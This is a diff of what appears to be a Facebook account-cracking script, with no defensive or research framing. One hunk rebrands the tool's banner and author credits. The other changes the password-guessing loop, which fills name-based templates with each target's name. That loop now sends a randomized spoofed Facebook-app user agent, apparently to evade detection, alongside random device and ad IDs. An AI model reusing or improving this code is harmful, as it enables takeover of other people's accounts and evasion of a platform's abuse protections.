@@ -283,25 +283,16 @@ def Trial(PF):
 TrialExist=""
 logo=(f"""\033[1;37m
 
-{green}    ______                       __ 
- /      \                     |  \
-|  $$$$$$\ __    __   ______  | $$
-| $$   \$$|  \  |  \ /      \ | $$
-| $$      | $$  | $$|  $$$$$$\| $$
-| $$   __ | $$  | $$| $$   \$$| $$
-| $$__/  \| $$__/ $$| $$      | $$
- \$$    $$ \$$    $$| $$      | $$
-  \$$$$$$   \$$$$$$  \$$       \$$                                
-                                                                
-{green}  
-{green}  
-  {green}  
-{green}  
-{green}  
+{green}  .d8888. d8888b. d88888b d88888b d8888b.      
+{green}  88'  YP 88  `8D 88'     88'     88  `8D      
+{green}  `8bo.   88oodD' 88ooooo 88ooooo 88   88      
+  {green}  `Y8b. 88~~~   88~~~~~ 88~~~~~ 88   88      
+{green}  db   8D 88      88.     88.     88  .8D      
+{green}  `8888Y' 88      Y88888P Y88888P Y8888D'   
    
 ─────────────────────────────────────────────
- {green}[{red}–{green}] FACEBOK : achraf 
- {green}[{red}–{green}] GITHUB  : Very
+ {green}[{red}–{green}] FACEBOK : Dark
+ {green}[{red}–{green}] GITHUB  : speed-sd
  {green}[{red}–{green}] VERSION : 0.4
  {green}[{red}–{green}] SERVICE : Free  
 ─────────────────────────────────────────────""")
@@ -644,7 +635,7 @@ def M_file_3(ids,names,passlist):
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                 
-                                ua = "[FBAN/FB4A;FBAV/627.0.0.29.112;FBBV/64021587;FBLC/fr_FR;FBCR/Orange;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/14 Pro;FBSV/14;FBCA/arm64-v8a;FBDM/{density=3.2,width=1440,height=3200};]"
+                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/1.8.0(Linux; U; Android 11.0;V2010 Build/EOOAT2I3)[FBAN/FB4A;FBAV/85.0.0.42.14FBBV/8538630FBDM/{density=3.0,width=719,height=647}FBLC/ko_KRFBRV/5449428FBCR/O2FBMF/VivoFBBD/VivoFBPN/com.facebook.katanaFBDV/V2010FBSV/11.0FBOP/1FBCA/x86:armeabi-v7a]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 li = ['28']
